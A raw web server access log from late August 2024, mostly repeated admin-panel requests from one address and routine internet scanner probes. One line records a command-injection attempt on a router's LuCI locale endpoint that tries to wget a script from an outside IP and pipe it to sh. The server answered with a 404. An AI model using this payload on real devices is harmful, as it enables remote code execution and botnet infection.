94.177.73.49 - - [29/Aug/2024:15:14:46 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
94.177.73.49 - - [29/Aug/2024:15:16:51 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
94.177.73.49 - - [29/Aug/2024:15:17:00 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
94.177.73.49 - - [29/Aug/2024:15:17:12 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
185.224.128.83 - - [29/Aug/2024:15:17:14 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 805
94.177.73.49 - - [29/Aug/2024:15:17:25 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
94.177.73.49 - - [29/Aug/2024:15:17:26 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55217
94.177.73.49 - - [29/Aug/2024:15:17:27 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55221
94.177.73.49 - - [29/Aug/2024:15:17:27 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55221
94.177.73.49 - - [29/Aug/2024:15:22:42 +0330] "POST /admin/?page=33 HTTP/1.1" 200 31375
94.177.73.49 - - [29/Aug/2024:15:22:55 +0330] "POST /admin/?page=33 HTTP/1.1" 200 48881
94.177.73.49 - - [29/Aug/2024:15:23:12 +0330] "POST /admin/?page=33 HTTP/1.1" 200 47088
94.177.73.49 - - [29/Aug/2024:15:26:37 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55226
94.177.73.49 - - [29/Aug/2024:15:26:40 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55226
94.177.73.49 - - [29/Aug/2024:15:32:59 +0330] "GET /admin/?page=21 HTTP/1.1" 200 94288
94.177.73.49 - - [29/Aug/2024:15:33:54 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26501
94.177.73.49 - - [29/Aug/2024:15:33:55 +0330] "POST /admin/?page=21 HTTP/1.1" 200 18598
94.177.73.49 - - [29/Aug/2024:15:34:36 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55226
94.177.73.49 - - [29/Aug/2024:15:38:08 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 55226
94.177.73.49 - - [29/Aug/2024:15:41:21 +0330] "GET /admin/?page=34&item=66cef488eb99b14a0e1c1039 HTTP/1.1" 200 38849
94.177.73.49 - - [29/Aug/2024:15:41:21 +0330] "GET /resources/images/background/chat.png HTTP/1.1" 404 815
94.177.73.49 - - [29/Aug/2024:15:41:36 +0330] "POST /admin/?page=34&item=66cef488eb99b14a0e1c1039 HTTP/1.1" 200 -
94.177.73.49 - - [29/Aug/2024:15:41:37 +0330] "POST /admin/?page=12&item=66cd44a1562d264a15a0f8ce HTTP/1.1" 200 -
94.177.73.49 - - [29/Aug/2024:15:41:38 +0330] "POST /admin/?page=34&item=66cfa8b8cc20cc4a23a2429f HTTP/1.1" 200 -
94.177.73.49 - - [29/Aug/2024:15:42:21 +0330] "POST /admin/?page=33 HTTP/1.1" 200 47130
94.177.73.49 - - [29/Aug/2024:15:42:23 +0330] "POST /admin/?page=33 HTTP/1.1" 200 47192
94.177.73.49 - - [29/Aug/2024:15:42:36 +0330] "POST /admin/?page=4 HTTP/1.1" 200 -
185.224.128.59 - - [29/Aug/2024:16:06:28 +0330] "GET / HTTP/1.1" 200 6041
45.125.66.171 - - [29/Aug/2024:16:07:11 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
87.236.176.186 - - [29/Aug/2024:18:11:04 +0330] "fox a null" 400 1855
87.236.176.211 - - [29/Aug/2024:18:11:19 +0330] "GET / HTTP/1.1" 200 6040
185.224.128.84 - - [29/Aug/2024:18:21:08 +0330] "GET / HTTP/1.1" 200 6040
104.168.70.165 - - [29/Aug/2024:19:12:14 +0330] "GET / HTTP/1.1" 200 6040
154.213.184.18 - - [29/Aug/2024:19:40:42 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
45.125.66.171 - - [29/Aug/2024:19:54:06 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
85.97.197.84 - - [29/Aug/2024:19:55:58 +0330] "GET / HTTP/1.0" 200 6038
154.213.184.25 - - [29/Aug/2024:20:50:33 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
45.156.128.39 - - [29/Aug/2024:21:59:03 +0330] "GET / HTTP/1.1" 200 6040
154.213.184.25 - - [29/Aug/2024:21:59:30 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
154.213.184.18 - - [29/Aug/2024:23:50:03 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
